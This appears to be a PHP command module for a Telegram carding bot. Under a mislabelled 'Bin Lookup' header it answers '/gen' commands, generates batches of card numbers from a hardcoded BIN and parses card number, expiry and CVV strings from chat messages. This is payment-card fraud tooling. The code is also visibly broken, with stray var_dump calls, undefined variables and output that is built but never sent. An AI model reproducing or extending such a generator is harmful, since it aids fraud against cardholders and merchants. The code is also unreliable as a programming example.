<?php

/*

///==[Bin Lookup Commands]==///

/bin 123 - Returns the Bin info

*/


include __DIR__ . "/../config/config.php";
include __DIR__ . "/../config/variables.php";
include_once __DIR__ . "/../functions/bot.php";
include_once __DIR__ . "/../functions/db.php";
include_once __DIR__ . "/../functions/functions.php";

$generator = new Plansky\CreditCard\Generator();
$genvalue = $generator->lot(10, '408540402824', 15);
var_dump($genvalue);
////////////====[MUTE]====////////////
if(strpos($message, "/gen") === 0 || strpos($message, "!gen") === 0 || strpos($message, ".gen") === 0){
    $antispam = antispamCheck($userId);
    $isPremium = get_prem_info($userId);
    addUser($userId);
    if ($antispam != False){
        bot('sendmessage',[
            'chat_id'=>$chat_id,
            'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
            'parse_mode'=>'html',
            'reply_to_message_id'=> $message_id
        ]);
        return;

    }else {
        $messageidtoedit1 = bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "<b>Wait for Result...</b>",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id

        ]);



        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);


        if (preg_match_all("/(\d{15})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{4})/", $lista, $matches)||preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
            $yy1 = substr($yy, 2, 2);
            $bin = substr($cc, 0, 6);
            $cbin = substr($cc, 0, 1);

            foreach ($genvalue as $ccs) {
                $val = $val . $ccs . "<br>";

            }

                bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"
<b>Card -»</b> <code>$inpt</code>
<code>".var_dump($s)."</code>
<b>Took -»</b> <b>$time</b><b>s</b>
<b>Gateway -» CC GEN</b>
<b>------- Bin Info -------</b>"]);


        }else{
            bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Never Gonna Give you Up!

Provide a Bin!</b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'

            ]);

        }
    }
}


?>